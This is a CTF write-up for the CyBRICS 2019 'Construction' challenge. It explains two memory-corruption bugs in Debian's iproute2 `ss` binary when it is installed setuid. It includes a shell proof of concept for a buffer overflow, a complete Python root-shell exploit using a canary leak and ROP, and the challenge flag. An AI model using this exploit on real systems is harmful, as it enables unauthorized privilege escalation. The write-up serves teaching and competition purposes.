---
layout: post
title: "[CyBRICS 2019] Construction (500)"
author: Robert Xiao
---

# CyBRICS CTF
## Construction

- [Description](#description)
- [Finding a Bug](#finding-the-bug)
- [Exploit](#exploit)

### Description

We're given SSH credentials to a server, which appears to be a Docker instance. When we login, we get a prompt that tells us to use the `ss` program to check for open ports. A Python server is listening on one port, but when you try to talk to it it simply says that the challenge isn't ready yet. A hint says that the script it's running contains the flag - but of course the script is owned by root in a root-owned and world-unreadable directory.

Suspiciously, the `ss` program is setuid root. This is not a normal configuration: `ss` is part of the iproute2 package, but the binary isn't usually setuid as it can dump out privileged networking information.

### Finding a Bug

Clearly, the intention here is to attack the `ss` binary. If we can exploit some sort of vulnerability in the binary, we can elevate to root and read the flag file. A quick check of `dpkg` on the server shows that the iproute2 package installed is `iproute2_4.9.0-1+deb9u1_amd64`; downloading that package from the Debian servers shows that the `ss` binary on the victim server is identical to the published Debian one (sha1sum `c8c859e2b823830e77bc8b348e33f45414c0b16a`). Oh joy - we get to exploit a published, off-the-shelf binary - I wonder how hard that will be??

Luckily, since we know exactly which package and version this binary came from, we can grab the sources (plus Debian modifications) from the source package. The binary is built from `misc/ss.c` in the `iproute2-4.9.0` source distribution, and the Debian modifications are quite minimal (just adding a `moo` function as an easter egg). 

Reading the code, I noticed a few funny things off the bat. First of all, although `ss` should be reading only `/proc`-type system files, it actually has a bunch of environment variables to control exactly what it reads. For example, if you set `PROC_ROOT=.` it will attempt to read files from `.` instead of `/proc`. Better yet, those environment variables aren't considered "sensitive", so they are forwarded to the setuid program (normally, certain sensitive environment variables like `LD_PRELOAD` are dropped for setuid programs for security reasons). Therefore, we can easily control the input that `ss` parses - for example, we could give it a fake version of `/proc/net/tcp`.

The second funny thing is that it was almost comically easy to find a buffer overflow in the program. They use `snprintf` everywhere - as they should - but they also use plain `fscanf` in several places. In particular, in `netlink_show_one`, they have `fscanf(fp, "%*d (%[^)])", procname)` where `procname` is a stack buffer; this is an easy-to-trigger stack buffer overflow (via the `%[^)]` bit which reads characters until `)` without regard for buffer size). We can hit this buffer overflow with the following sequence of commands:

```
cat > netlink <<EOF
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops     Inode
0000000000000000 0   1140   00000000 768      0        0 2        0        20521   
EOF

mkdir -p 1140
cat > 1140/stat <<EOF
1140 (aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)
EOF

PROC_ROOT=. PROC_NET_NETLINK=netlink ss -A netlink -a
```

This creates a fake `netlink` file, with an entry for PID 1140; when `ss` goes to check `/proc/<pid>/stat` it uses `./<pid>/stat` instead, promptly reads a huge pile of `a` characters into a 64-byte process name buffer which triggers a buffer overflow.

Alas, Debian mandates stack canaries on everything (along with full PIE and ASLR), so this particular bug turns out to be sort of hard to exploit (as we don't get an easy leak from it). But, finding this bug within a few minutes of looking at the `ss.c` source was really encouraging, because it meant that there were probably more bugs like this one.

### Exploit

Knowing that `ss` was generally being unsafe with file reads, I did a search for `fread`, and quickly turned up two references in `tcp_show_netlink_file`. This function reads the file `$TCPDIAG_FILE` (again, another environment variable), and does some terribly unsafe buffer parsing. It reads records of type `nlmsg`, which contain TCP diagnostic information. These records are variable length, so `tcp_show_netlink_file` has a stack buffer of size 16384 and straight `fread` calls to it using an unchecked variable length. This line:

`		status = fread(h+1, 1, NLMSG_ALIGN(h->nlmsg_len-sizeof(*h)), fp);`

reads approximately `h->nlmsg_len` bytes, which is a fully controlled (and unchecked) integer parameter. Better yet - this whole parsing loop is wrapped in a `while(1)`, which means we can repeatedly smash the stack using different `nlmsg`s. So, the idea is to do a leak of the canary and any relevant addresses followed by the usual stack smash with canary and ROP.

In order to make this parser "interactive", I wrote a little Python wrapper which creates a named FIFO and points `ss` at the FIFO. Now, the Python script can write messages into the FIFO, which are parsed as `nlmsg` objects by `ss`, and then the Python script can read the `ss` output to obtain the leaked data, then put more messages into the FIFO based on that information.

To actually pull off the leak, I observed that `parse_diag_msg`, which is used to parse the received `nlmsg`, calls `parse_rtattr` to pull variable-sized "attribute" records off of the message. Our `nlmsg` therefore consists of a long, dummy `rtattr` to pad out to a particular length, followed by a truncated `INET_DIAG_MARK` rtattr. The `INET_DIAG_MARK` payload consists of a single four-byte integer. The `nlmsg` we send contains space for the `rtattr` header (defining the type and length) but does not include the actual value; therefore, when this rtattr is parsed by `parse_rtattr`, it will take the value from the stack immediately following the sent buffer. The `INET_DIAG_MARK` rtattr value is printed out by `sock_details_print`, which we can request via the `-e` flag to `ss`.

Thus, our exploit does the following:

- Send an overlong `nlmsg` structure, consisting of one big dummy `rtattr` and a small, truncated `INET_DIAG_MARK` rtattr that ends right before the stack canary. This causes `ss` to print out the "mark", which is four bytes of the canary.
- Send another overlong `nlmsg` structure with the same structure but four more bytes in the dummy `rtattr`. This lets us leak the next four bytes of the canary (overwriting the other half - but this is OK because the `while(1)` loop means we won't return to trigger the canary check).
- Send another few overlong `nlmsg` structures to leak a `libc` address on the stack.
- Send a final `nlmsg` which simply contains a properly-positioned canary and ropchain, with the message type `NLMSG_DONE` to cause `tcp_show_netlink_file` to return after reading that message onto the stack.

This is a very reliable exploit, and it is quite simple to carry out. Here is the source code for the exploit in full:

```python
import os
import struct

libc_start_main = 0x202e1
one_gadget = 0x3f35a
exe = '/bin/ss'

try:
    os.unlink('/tmp/dump')
except OSError:
    pass

def nlmsghdr(len, type=0, flags=0, seq=0, pid=0):
    return struct.pack('<IHHII', len, type, flags, seq, pid)

os.mkfifo('/tmp/dump')

# pty here to force ss to be line-buffered
import pty
cpid, cfd = pty.fork()
if not cpid:
    os.execve(exe, [exe, '-A', 'tcp', '-a', '-e'], {'TCPDIAG_FILE': '/tmp/dump'})

ssf = os.fdopen(cfd, 'r')
ssf2 = os.fdopen(cfd, 'w')
outf = open('/tmp/dump', 'w')

raw_input('Pause...')

# skip header line
print(repr(ssf.readline()))

def dump(offset):
    # NLMSG_LENGTH(sizeof(struct inet_diag_msg)) = 88
    INET_DIAG_MARK = 15
    # Leak canary using INET_DIAG_MARK rtattr
    payload = b'\x00\x02'.ljust(72, '\0')
    payload += struct.pack('<HH', offset, 0) + 'x' * (offset - 4)
    payload += struct.pack('<HH', 4, INET_DIAG_MARK) # truncated rtattr - will leak 4 bytes right after this
    outf.write(nlmsghdr(16 + len(payload)))
    outf.write(payload)
    outf.flush()
    line = ssf.readline()
    print(repr(line))
    if 'fwmark' in line:
        return int(line.split('fwmark:')[1], 0)
    return 0

# Leak canary & libc addr
c1 = dump(16300)
c2 = dump(16304)
canary = c1 | (c2 << 32)
print("canary: 0x%x" % canary)

# Dump whole stack (for debug)
# for i in range(16308, 17000, 4):
#     print i, hex(dump(i))

c1 = dump(16556)
c2 = dump(16560)
libc_base = (c1 | (c2 << 32)) - libc_start_main
print("libc base offset: 0x%x" % libc_base)

# ROP to win
# (well, since we're lazy, one_gadget plus a stack clear is enough)
NLMSG_DONE = 3
payload = 'C' * (72 + 16304) + struct.pack('<Q', canary) + 'B' * 40
payload += struct.pack('<Q', libc_base + one_gadget) # one gadget
payload += b'\x00' * 0x60
outf.write(nlmsghdr(16 + len(payload), NLMSG_DONE))
outf.write(payload)
outf.flush()

# Very minimal interact() implementation
import sys
import threading
def reader():
    while 1:
        sys.stdout.write(ssf.read(1))
        sys.stdout.flush()

threading.Thread(target=reader).start()
while 1:
    ssf2.write(raw_input('$ ') + '\n')
    ssf2.flush()

# Flag:
# cybrics{PWN3D_the_UNPWN4BLE!}
```
